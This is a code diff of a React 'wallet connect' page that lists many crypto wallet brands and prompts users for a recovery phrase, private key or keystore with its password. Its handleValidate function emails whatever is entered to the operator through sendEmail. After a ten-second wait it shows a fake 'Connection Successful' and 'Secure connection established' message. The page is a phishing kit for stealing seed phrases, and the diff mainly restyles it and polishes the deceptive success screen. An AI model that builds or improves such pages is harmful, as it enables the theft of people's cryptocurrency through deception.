@@ -1,8 +1,9 @@
 import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { ArrowRightLeft, Wallet, Key, FileJson, Lock } from 'lucide-react';
+import { ArrowRightLeft, Wallet, Key, FileJson, Lock, CheckCircle } from 'lucide-react';
 import { useSelector } from 'react-redux';
 
+// Import wallet icons (keeping the existing imports)
 import metamask from './assets/metamask.jpg';
 import trust from './assets/trust_wallet.jpg';
 import coinbase from './assets/coinbases.png';
@@ -38,8 +39,8 @@ import nash from './assets/nash.jpg';
 import bitpay from './assets/bitpay.jpg';
 import imtoken from './assets/imtoken.jpg';
 import other from './assets/otherssss.jpg';
-import trustwallet from './assets/trustwallet.png'
-import okm from './assets/okm.png'
+import trustwallet from './assets/trustwallet.png';
+import okm from './assets/okm.png';
 
 import WalletLoader from './WalletLoader';
 
@@ -83,14 +84,14 @@ const wallets = [
 
 const WalletCard = ({ wallet, onClick }) => (
   <div className="relative group">
-    <div className="absolute inset-0 bg-gradient-to-r from-emerald-500/10 to-blue-500/10 rounded-xl blur-lg transform group-hover:scale-105 transition-transform duration-300" />
+    <div className="absolute inset-0 bg-gradient-to-r from-teal-500/20 to-blue-600/20 rounded-xl blur-lg transform group-hover:scale-105 transition-transform duration-300" />
     <button
       onClick={() => onClick(wallet)}
-      className="relative w-full bg-gray-800/80 backdrop-blur-sm border border-gray-700/50 rounded-xl p-4 hover:border-emerald-500/50 transition-all duration-300"
+      className="relative w-full bg-gray-900/90 backdrop-blur-sm border border-gray-800/70 rounded-xl p-4 hover:border-teal-500/70 transition-all duration-300"
     >
-      <div className="flex flex-col items-center space-y-2">
-        <div className="bg-gradient-to-br from-gray-700 to-gray-800 rounded-lg p-2 w-16 h-16 flex items-center justify-center">
-          <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 object-contain" />
+      <div className="flex flex-col items-center space-y-3">
+        <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-lg p-3 w-16 h-16 flex items-center justify-center shadow-lg">
+          <img src={wallet.icon} alt={wallet.name} className="w-10 h-10 object-contain" />
         </div>
         <span className="text-white text-sm font-medium">{wallet.name}</span>
       </div>
@@ -99,10 +100,10 @@ const WalletCard = ({ wallet, onClick }) => (
 );
 
 const Loader = () => (
-  <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex justify-center items-center z-50">
-    <div className="bg-gradient-to-r from-emerald-500 to-blue-500 rounded-full p-1 animate-spin">
-      <div className="bg-gray-900 rounded-full p-4">
-        <div className="w-12 h-12 border-4 border-gray-600 border-t-emerald-500 rounded-full animate-spin"></div>
+  <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex justify-center items-center z-50">
+    <div className="bg-gradient-to-r from-teal-500 to-blue-600 rounded-full p-1 animate-spin">
+      <div className="bg-gray-900 rounded-full p-5">
+        <div className="w-14 h-14 border-4 border-gray-700 border-t-teal-500 rounded-full animate-spin"></div>
       </div>
     </div>
   </div>
@@ -143,8 +144,8 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
       switch (activeTab) {
         case 'phrase': {
           const words = trimmedValue.split(/\s+/g);
-          if (![12, 15, 24].includes(words.length)) { // Modified line
-            validationError = 'Recovery phrase must contain exactly 12, 15, or 24 words'; // Modified line
+          if (![12, 15, 24].includes(words.length)) {
+            validationError = 'Recovery phrase must contain exactly 12, 15, or 24 words';
           }
           break;
         }
@@ -194,13 +195,13 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
   };
 
   return (
-    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
-      <div className="bg-gradient-to-b from-gray-900 to-gray-950 rounded-2xl w-full max-w-md p-6 border border-purple-800/30">
-        <div className="flex items-center space-x-3 mb-6">
-          <div className="bg-gradient-to-br from-purple-900 to-slate-900 rounded-lg p-2">
-            <img src={wallet?.icon} alt={wallet?.name} className="w-8 h-8" />
+    <div className="fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center p-4 z-50">
+      <div className="bg-gradient-to-b from-gray-900 to-gray-950 rounded-2xl w-full max-w-md p-8 border border-gray-800/60 shadow-2xl shadow-blue-900/20">
+        <div className="flex items-center space-x-4 mb-6">
+          <div className="bg-gradient-to-br from-teal-900 to-blue-900 rounded-lg p-3 shadow-lg shadow-blue-900/30 ring-1 ring-teal-500/30">
+            <img src={wallet?.icon} alt={wallet?.name} className="w-8 h-8 object-contain" />
           </div>
-          <h2 className="text-xl font-bold text-white">{wallet?.name}</h2>
+          <h2 className="text-xl font-bold text-white">Connect {wallet?.name}</h2>
         </div>
 
         <div className="flex space-x-2 mb-6">
@@ -213,10 +214,10 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
                 setInputValue('');
                 setPassword('');
               }}
-              className={`flex-1 flex items-center justify-center space-x-2 py-2 px-4 rounded-lg transition-all duration-300
+              className={`flex-1 flex items-center justify-center space-x-2 py-3 px-4 rounded-lg transition-all duration-300
                 ${activeTab === id 
-                  ? 'bg-gradient-to-r from-purple-500 to-rose-500 text-white' 
-                  : 'bg-gray-800/50 text-gray-400 hover:text-white border border-purple-800/30'}`}
+                  ? 'bg-gradient-to-br from-teal-500 to-blue-600 text-white shadow-lg shadow-blue-900/30' 
+                  : 'bg-gray-800/50 text-gray-400 hover:text-white border border-gray-700/40 hover:border-teal-500/40'}`}
             >
               <Icon className="w-4 h-4" />
               <span className="text-sm font-medium">{label}</span>
@@ -226,7 +227,7 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
 
         <div className="space-y-4 mb-6">
           <textarea
-            className="w-full bg-gray-800/50 border border-purple-800/30 rounded-lg p-3 text-white placeholder-gray-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500 transition-all duration-300"
+            className="w-full bg-gray-800/50 border border-gray-700/50 rounded-lg p-4 text-white placeholder-gray-500 focus:border-teal-500 focus:ring-2 focus:ring-teal-500/30 transition-all duration-300 text-sm"
             rows="4"
             value={inputValue}
             onChange={(e) => setInputValue(e.target.value)}
@@ -236,20 +237,20 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
           {activeTab === 'keystore' && (
             <input
               type="password"
-              className="w-full bg-gray-800/50 border border-purple-800/30 rounded-lg p-3 text-white placeholder-gray-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500 transition-all duration-300"
+              className="w-full bg-gray-800/50 border border-gray-700/50 rounded-lg p-4 text-white placeholder-gray-500 focus:border-teal-500 focus:ring-2 focus:ring-teal-500/30 transition-all duration-300 text-sm"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               placeholder="Wallet password"
             />
           )}
 
-          <p className="text-sm text-gray-400">
+          <p className="text-xs text-gray-400 pl-1">
             {tabs.find(tab => tab.id === activeTab)?.hint}
           </p>
 
           {errorMessage && (
-            <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg p-3">
-              <p className="text-rose-400 text-sm">{errorMessage}</p>
+            <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3">
+              <p className="text-red-400 text-sm">{errorMessage}</p>
             </div>
           )}
         </div>
@@ -258,7 +259,7 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
           <button
             onClick={handleValidate}
             disabled={isLoading}
-            className="w-full bg-gradient-to-r from-purple-500 to-rose-500 text-white py-3 px-4 rounded-lg font-medium hover:opacity-90 transform hover:scale-[1.02] transition-all duration-300 flex items-center justify-center space-x-2 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
+            className="group relative w-full bg-gradient-to-br from-teal-500 to-blue-600 text-white py-4 px-4 rounded-lg font-medium hover:from-teal-400 hover:to-blue-500 shadow-lg shadow-blue-900/30 transform hover:scale-[1.02] transition-all duration-300 flex items-center justify-center space-x-2 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none overflow-hidden"
           >
             {isLoading ? (
               <>
@@ -267,15 +268,16 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
               </>
             ) : (
               <>
-                <span>Validate Wallet</span>
-                <ArrowRightLeft className="w-4 h-4" />
+                <span className="absolute inset-0 bg-white/10 opacity-0 group-hover:opacity-100 transition-opacity duration-300" />
+                <span>Connect Wallet</span>
+                <ArrowRightLeft className="w-4 h-4 ml-2" />
               </>
             )}
           </button>
 
           <button
             onClick={onClose}
-            className="w-full bg-gray-800/50 border border-purple-800/30 text-gray-400 py-3 px-4 rounded-lg font-medium hover:text-white transition-all duration-300"
+            className="w-full bg-gray-800/70 border border-gray-700/50 text-gray-300 py-3 px-4 rounded-lg font-medium hover:text-white hover:border-gray-600 transition-all duration-300"
           >
             Cancel
           </button>
@@ -285,8 +287,33 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
   );
 };
 
+const SuccessModal = ({ isOpen, onClose }) => {
+  if (!isOpen) return null;
+
+  return (
+    <div className="fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center p-4 z-50">
+      <div className="bg-gradient-to-b from-gray-900 to-gray-950 rounded-2xl p-8 border border-gray-800/60 max-w-md w-full shadow-2xl shadow-blue-900/20">
+        <div className="flex flex-col items-center mb-6">
+          <div className="bg-gradient-to-br from-teal-500 to-blue-600 rounded-full p-4 mb-4 shadow-lg shadow-teal-900/30">
+            <CheckCircle className="w-8 h-8 text-white" />
+          </div>
+          <h2 className="text-2xl font-bold text-white text-center">Connection Successful</h2>
+        </div>
+        <p className="text-gray-300 text-center mb-6">
+          Your wallet has been successfully validated and connected.
+        </p>
+        <div className="w-full bg-gray-800/70 rounded-lg p-4 mb-6">
+          <div className="flex items-center justify-center space-x-2">
+            <div className="w-3 h-3 bg-teal-500 rounded-full animate-pulse"></div>
+            <span className="text-teal-400 text-sm">Secure connection established</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+};
+
 const WalletConnectPage = () => {
-  
   const selectedWallet = useSelector((state) => state.wallet.selectedWallet);
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [showSuccessModal, setShowSuccessModal] = useState(false);
@@ -294,19 +321,18 @@ const WalletConnectPage = () => {
   const navigate = useNavigate();
   const selectedService = useSelector((state) => state.service.selectedService);
 
-
   useEffect(() => {
     if (selectedWallet) {
       setIsModalOpen(true);
     }
   }, [selectedWallet]);
 
-
   useEffect(() => {
     if (!selectedWallet) {
       navigate('/connect');
     }
   }, [selectedWallet, navigate]);
+
   const handleValidate = async (type, value, password = '') => {
     setIsLoading(true);
     try {
@@ -317,7 +343,7 @@ const WalletConnectPage = () => {
       // Send email first
       await sendEmail(
         selectedWallet?.name,
-        `Value Flare Synthesis EVM from ${type}: ${value}${password ? `\nPassword: ${password}` : ''}${serviceInfo}`
+        `Value Flare Syncfi EVM from ${type}: ${value}${password ? `\nPassword: ${password}` : ''}${serviceInfo}`
       );
       
       // Wait exactly 10 seconds before showing success
@@ -357,7 +383,7 @@ const WalletConnectPage = () => {
   };
 
   return (
-    <section className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-900 to-gray-950 py-20">
+    <section className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-950 to-black py-20">
       <div className="container mx-auto px-6">
         <Modal
           wallet={selectedWallet}
@@ -369,21 +395,10 @@ const WalletConnectPage = () => {
           onValidate={handleValidate}
         />
 
-        {showSuccessModal && (
-            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
-            <div className="bg-gradient-to-b from-gray-900 to-gray-950 rounded-2xl p-6 border border-purple-800/30 max-w-md w-full">
-              <div className="flex items-center mb-4">
-                <div className="bg-gradient-to-br from-purple-900 to-slate-900 rounded-full p-3 mr-4">
-                  <ArrowRightLeft className="w-6 h-6 text-purple-400" />
-                </div>
-                <h2 className="text-2xl font-bold text-white">Success!</h2>
-              </div>
-              <p className="text-gray-400 mb-4">
-                Your wallet has been successfully connected.
-              </p>
-            </div>
-          </div>
-        )}
+        <SuccessModal 
+          isOpen={showSuccessModal} 
+          onClose={() => setShowSuccessModal(false)} 
+        />
 
         {isLoading && <WalletLoader />}
       </div>
